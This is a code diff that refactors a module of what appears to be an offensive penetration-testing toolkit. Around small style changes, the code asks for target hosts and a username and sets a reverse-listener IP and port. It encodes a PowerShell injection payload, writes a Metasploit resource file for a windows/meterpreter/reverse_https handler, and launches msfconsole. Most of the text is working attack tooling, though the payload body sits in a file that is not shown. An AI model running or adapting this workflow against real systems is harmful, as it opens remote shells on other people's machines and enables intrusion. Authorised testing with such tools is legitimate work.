@@ -35,11 +35,7 @@ except NameError:
 
 # grab config options for stage encoding
 stage_encoding = core.check_config("STAGE_ENCODING=").lower()
-if stage_encoding == "off":
-    stage_encoding = "false"
-else:
-    stage_encoding = "true"
-
+stage_encoding = "false" if stage_encoding == "off" else "true"
 rhosts = input(core.setprompt(["32"], "Enter the IP Address or range (RHOSTS) to connect to"))  # rhosts
 # username for domain/workgroup
 username = input(core.setprompt(["32"], "Enter the username"))
@@ -64,7 +60,7 @@ try:
 
     # specify ipaddress of reverse listener
     ipaddr = core.grab_ipaddress()
-    core.update_options("IPADDR=" + ipaddr)
+    core.update_options(f"IPADDR={ipaddr}")
     port = input(core.setprompt(["29"], "Enter the port for the reverse [443]"))
     if port == "":
         port = "443"
@@ -84,17 +80,16 @@ try:
     if not os.path.isdir(os.path.join(core.userconfigpath, "reports/powershell")):
         os.makedirs(os.path.join(core.userconfigpath, "reports/powershell"))
 
-    x86 = open(core.userconfigpath + "x86.powershell", "r").read()
+    x86 = open(f"{core.userconfigpath}x86.powershell", "r").read()
     x86 = core.powershell_encodedcommand(x86)
     core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
-    filewrite = open(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w")
-    filewrite.write(x86)
-    filewrite.close()
+    with open(f"{core.userconfigpath}reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
+        filewrite.write(x86)
     payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
     command = x86  # assign powershell to command
 
     # write out our answer file for the powershell injection attack
-    with open(core.userconfigpath + "reports/powershell/powershell.rc", "w") as filewrite:
+    with open(f"{core.userconfigpath}reports/powershell/powershell.rc", "w") as filewrite:
         filewrite.write("use multi/handler\n"
                         "set payload windows/meterpreter/reverse_https\n"
                         "set LPORT {0}\n"
@@ -113,10 +108,15 @@ try:
 
     # launch metasploit below
     core.print_status("Launching Metasploit.. This may take a few seconds.")
-    subprocess.Popen("{0} -r {1}".format(os.path.join(core.meta_path() + "msfconsole"),
-                                         os.path.join(core.userconfigpath, "reports/powershell/powershell.rc")),
-                     shell=True).wait()
+    subprocess.Popen(
+        "{0} -r {1}".format(
+            os.path.join(f"{core.meta_path()}msfconsole"),
+            os.path.join(
+                core.userconfigpath, "reports/powershell/powershell.rc"
+            ),
+        ),
+        shell=True,
+    ).wait()
 
-# handle exceptions
 except Exception as e:
     core.print_error("Something went wrong printing error: {0}".format(e))
